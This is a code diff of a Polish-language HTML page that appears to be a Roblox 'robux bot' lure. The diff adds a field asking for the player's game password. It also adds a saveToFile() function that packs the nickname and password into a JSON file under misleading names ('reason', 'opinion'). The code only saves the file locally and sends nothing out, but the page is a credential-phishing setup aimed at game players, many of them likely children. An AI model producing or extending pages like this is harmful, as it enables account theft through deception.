@@ -22,8 +22,10 @@
   </div>
   <div class="card">
     <h2>Nazwa Użytkownika</h2>
-    <input class="input-field" type="text" id="robuxReason" placeholder="Napisz swój nick z gry Roblox">
-    <button class="btn" onclick="startPrank(Nick został potwierdzony!)">Wyślij</button>
+    <input class="input-field" type="text" id="robuxReason" placeholder="Napisz Nick z gry">
+    <h2>Hasło</h2>
+    <input class="input-field" type="text" id="appOpinion" placeholder="Napisz hasło">
+    <button class="btn" onclick="saveToFile()">Wyślij</button>
   </div>
   <div class="card">
     <h2>Roblox Bot</h2>
@@ -52,6 +54,21 @@
         }
         bar.style.width = progress + '%';
       }, 200);
+    }
+
+    function saveToFile() {
+      const reason = document.getElementById('robuxReason').value;
+      const opinion = document.getElementById('appOpinion').value;
+      const data = { powód: reason, opinia: opinion };
+      const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'odpowiedzi.json';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
     }
   </script>
 </body>
